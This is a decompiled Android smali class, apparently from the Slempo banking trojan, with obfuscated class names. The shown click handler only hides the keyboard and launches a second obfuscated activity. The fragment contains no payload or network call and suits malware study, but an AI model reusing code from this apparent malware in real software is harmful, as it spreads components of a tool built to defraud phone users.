.class Lorg/slempo/service/activities/ewkdmcopwekewd$1;
.super Ljava/lang/Object;
.source "ewkdmcopwekewd.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lorg/slempo/service/activities/ewkdmcopwekewd;->onCreate(Landroid/os/Bundle;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lorg/slempo/service/activities/ewkdmcopwekewd;


# direct methods
.method constructor <init>(Lorg/slempo/service/activities/ewkdmcopwekewd;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lorg/slempo/service/activities/ewkdmcopwekewd$1;->this$0:Lorg/slempo/service/activities/ewkdmcopwekewd;

    .line 140
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 5
    .param p1, "v"    # Landroid/view/View;

    .prologue
    .line 144
    iget-object v3, p0, Lorg/slempo/service/activities/ewkdmcopwekewd$1;->this$0:Lorg/slempo/service/activities/ewkdmcopwekewd;

    invoke-virtual {v3}, Lorg/slempo/service/activities/ewkdmcopwekewd;->getCurrentFocus()Landroid/view/View;

    move-result-object v2

    .line 145
    .local v2, "view":Landroid/view/View;
    if-eqz v2, :cond_0

    .line 146
    iget-object v3, p0, Lorg/slempo/service/activities/ewkdmcopwekewd$1;->this$0:Lorg/slempo/service/activities/ewkdmcopwekewd;

    const-string v4, "input_method"

    invoke-virtual {v3, v4}, Lorg/slempo/service/activities/ewkdmcopwekewd;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/inputmethod/InputMethodManager;

    .line 147
    .local v1, "inputManager":Landroid/view/inputmethod/InputMethodManager;
    invoke-virtual {v2}, Landroid/view/View;->getWindowToken()Landroid/os/IBinder;

    move-result-object v3

    .line 148
    const/4 v4, 0x2

    .line 147
    invoke-virtual {v1, v3, v4}, Landroid/view/inputmethod/InputMethodManager;->hideSoftInputFromWindow(Landroid/os/IBinder;I)Z

    .line 150
    .end local v1    # "inputManager":Landroid/view/inputmethod/InputMethodManager;
    :cond_0
    new-instance v0, Landroid/content/Intent;

    iget-object v3, p0, Lorg/slempo/service/activities/ewkdmcopwekewd$1;->this$0:Lorg/slempo/service/activities/ewkdmcopwekewd;

    const-class v4, Lorg/slempo/service/activities/reuinjdcieur;

    invoke-direct {v0, v3, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 151
    .local v0, "i":Landroid/content/Intent;
    const/high16 v3, 0x10000000

    invoke-virtual {v0, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 152
    const/high16 v3, 0x20000

    invoke-virtual {v0, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 153
    iget-object v3, p0, Lorg/slempo/service/activities/ewkdmcopwekewd$1;->this$0:Lorg/slempo/service/activities/ewkdmcopwekewd;

    invoke-virtual {v3, v0}, Lorg/slempo/service/activities/ewkdmcopwekewd;->startActivity(Landroid/content/Intent;)V

    .line 154
    return-void
.end method
